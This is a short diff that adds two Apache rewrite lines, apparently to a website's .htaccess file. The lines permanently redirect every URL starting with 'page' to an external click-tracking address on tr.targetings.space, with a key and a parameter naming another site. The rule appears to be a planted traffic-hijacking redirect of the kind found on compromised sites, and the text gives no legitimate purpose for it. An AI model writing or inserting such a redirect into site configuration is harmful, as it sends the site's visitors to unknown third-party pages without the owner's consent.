@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^page.*$ http://tr.targetings.space/click.php?key=bzzgygseof476boyv5kf&t6=power-muscle.website/ [R=301,L]
